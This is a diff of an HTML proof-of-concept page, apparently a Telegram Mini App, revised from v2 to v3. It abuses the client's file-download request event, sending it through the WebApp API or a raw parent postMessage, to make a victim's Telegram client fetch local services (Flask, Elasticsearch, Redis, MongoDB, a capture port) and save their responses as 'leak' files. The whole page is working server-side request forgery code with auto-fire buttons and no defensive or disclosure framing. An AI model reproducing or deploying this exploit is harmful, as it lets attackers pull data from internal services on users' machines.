@@ -1,125 +1,67 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>SSRF PoC v2</title>
+<head><meta charset="utf-8"><title>SSRF PoC v3</title>
 <style>
-body{background:#0a0a0a;color:#ddd;font:13px monospace;margin:0;padding:12px}
-h2{color:#f44;margin:0}
-#log{background:#111;padding:8px;margin:8px 0;max-height:300px;overflow:auto;white-space:pre-wrap;font:11px monospace}
-.ok{color:#0f0}.err{color:#f44}.info{color:#ff0}
-button{display:block;width:100%;margin:4px 0;padding:10px;background:#222;color:#fff;border:1px solid #444;font-size:12px;cursor:pointer;text-align:left}
-button.fire{background:#4a0000;border-color:#f44;font-size:14px}
+body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
+h2{color:#f44;margin:0 0 4px 0}
+#log{background:#111;padding:6px;max-height:260px;overflow:auto;white-space:pre-wrap;font:11px monospace}
+button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
+button.fire{background:#4a0000;border-color:#f44;font-size:13px}
 </style></head><body>
-<h2>SSRF PoC v2</h2>
-<div id="status">Initializing...</div>
-<div id="log"></div>
+<h2>SSRF PoC v3 — postMessage only</h2>
+<div id="log">Initializing...</div>
 <div id="btns"></div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-function L(s,c) {
-  const d = document.getElementById('log');
-  d.innerHTML += `<span class="${c||''}">${s}</span>\n`;
-  d.scrollTop = d.scrollHeight;
+const L = (s) => { const e=document.getElementById('log'); e.textContent += s+'\n'; e.scrollTop = e.scrollHeight; };
+
+L('=== v3: Direct postMessage ===');
+
+const msg = (cmd, data) => {
+  const payload = JSON.stringify({eventType: cmd, eventData: data});
+  L(`  TX: ${cmd} data=${JSON.stringify(data).substring(0,80)}`);
+  window.parent.postMessage(payload, '*');
+  L('  -> postMessage sent to parent');
+};
+
+try {
+  Telegram.WebApp.ready();
+  Telegram.WebApp.expand();
+  L('Telegram.WebApp OK');
+} catch(e) {
+  L('Telegram.WebApp ERROR: '+e.message);
 }
 
-L('=== Diagnostic Mode ===','info');
-L(`UserAgent: ${navigator.userAgent}`,'info');
+const T = [
+  ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask Dev (:5000)'],
+  ['http://127.0.0.1:9200/', 'elastic_leak.json', 'Elastic (:9200)'],
+  ['http://127.0.0.1:6379/', 'redis_leak.txt', 'Redis (:6379)'],
+  ['http://127.0.0.1:27017/', 'mongo_leak.txt', 'MongoDB (:27017)'],
+  ['http://127.0.0.1:9999/ssrf_capture', 'capture.json', 'Monitor (:9999)'],
+];
 
-const TW = window.Telegram?.WebApp;
-if (!TW) {
-  L('FATAL: Telegram.WebApp not found!','err');
-  document.getElementById('status').innerHTML = '<span class="err">NOT in Telegram</span>';
-} else {
-  L(`WebApp found: v${TW.version}`,'ok');
-  L(`initData: ${TW.initData?.substring(0,80)}...`,'ok');
-  TW.ready();
-  TW.expand();
-  document.getElementById('status').innerHTML = '<span class="ok">Telegram WebApp connected</span>';
-
-  L(`TW.requestFileDownload = ${typeof TW.requestFileDownload}`,'info');
-  L(`TW.isVersionAtLeast = ${typeof TW.isVersionAtLeast}`,'info');
-
-  if (typeof TW.requestFileDownload === 'function') {
-    L('requestFileDownload is AVAILABLE','ok');
-  } else {
-    L('requestFileDownload NOT available - using postMessage fallback','info');
-  }
-
-  const TARGETS = [
-    ['http://127.0.0.1:5000/', 'flask_leak.json'],
-    ['http://127.0.0.1:9200/', 'elastic_leak.json'],
-    ['http://127.0.0.1:6379/', 'redis_leak.txt'],
-    ['http://127.0.0.1:27017/', 'mongo_leak.txt'],
-    ['http://127.0.0.1:9999/ssrf_capture', 'capture_test.txt'],
-  ];
-
-  function fire(idx) {
-    const [url, name] = TARGETS[idx];
-    L(`[${idx+1}/${TARGETS.length}] ${url} -> ${name}`,'info');
-
-    let sent = false;
-
-    if (typeof TW.requestFileDownload === 'function') {
-      try {
-        TW.requestFileDownload({url: url, file_name: name});
-        L('  -> Sent via TW.requestFileDownload','ok');
-        sent = true;
-      } catch(e) {
-        L(`  -> TW.requestFileDownload ERROR: ${e.message}`,'err');
-      }
-    }
-
-    if (!sent && typeof TW.postEvent === 'function') {
-      try {
-        TW.postEvent('web_app_request_file_download', '', {url: url, file_name: name});
-        L('  -> Sent via TW.postEvent','ok');
-        sent = true;
-      } catch(e) {
-        L(`  -> TW.postEvent ERROR: ${e.message}`,'err');
-      }
-    }
-
-    if (!sent) {
-      try {
-        window.parent.postMessage(JSON.stringify({
-          eventType: 'web_app_request_file_download',
-          eventData: {url: url, file_name: name}
-        }), '*');
-        L('  -> Sent via postMessage fallback','ok');
-        sent = true;
-      } catch(e) {
-        L(`  -> postMessage ERROR: ${e.message}`,'err');
-      }
-    }
-  }
-
-  TW.onEvent('file_download_requested', function(e) {
-    L(`  <- EVENT: ${JSON.stringify(e)}`,'ok');
-  });
-
-  let idx = 0;
-  function fireNext() {
-    if (idx >= TARGETS.length) {
-      L('=== SCAN COMPLETE ===','info');
-      L('Check http://127.0.0.1:9999 in browser','info');
-      L('Check Downloads folder for leaked files','info');
-      return;
-    }
-    fire(idx);
-    idx++;
-    setTimeout(fireNext, 2000);
-  }
-
-  const btns = document.getElementById('btns');
-  btns.innerHTML = `
-    <button class="fire" onclick="idx=0;fireNext()">FIRE: Auto-Scan All 5 Services</button>
-    <button onclick="idx=0;fire(0)">Single: Flask Dev (:5000)</button>
-    <button onclick="idx=0;fire(1)">Single: Elastic (:9200)</button>
-    <button onclick="idx=0;fire(2)">Single: Redis (:6379)</button>
-    <button onclick="idx=0;fire(3)">Single: MongoDB (:27017)</button>
-    <button onclick="idx=0;fire(4)">Single: Monitor (:9999)</button>
-  `;
+let idx = 0;
+function fireNext() {
+  if (idx >= T.length) { L('=== DONE ==='); return; }
+  const [url, name, desc] = T[idx];
+  L(`[${idx+1}/${T.length}] ${desc}: ${url}`);
+  msg('web_app_request_file_download', {url, file_name: name});
+  idx++;
+  setTimeout(fireNext, 2500);
 }
+
+function single(i) { idx = 0; const [url,name,desc] = T[i]; L(`Single: ${desc}`); msg('web_app_request_file_download', {url, file_name: name}); }
+
+L('Ready.');
+document.getElementById('btns').innerHTML = `
+  <button class="fire" onclick="fireNext()">FIRE: Auto-Scan All 5</button>
+  <button onclick="single(0)">Flask Dev (:5000)</button>
+  <button onclick="single(1)">Elastic (:9200)</button>
+  <button onclick="single(2)">Redis (:6379)</button>
+  <button onclick="single(3)">MongoDB (:27017)</button>
+  <button onclick="single(4)">Monitor (:9999)</button>
+`;
 </script>
 </body>
 </html>
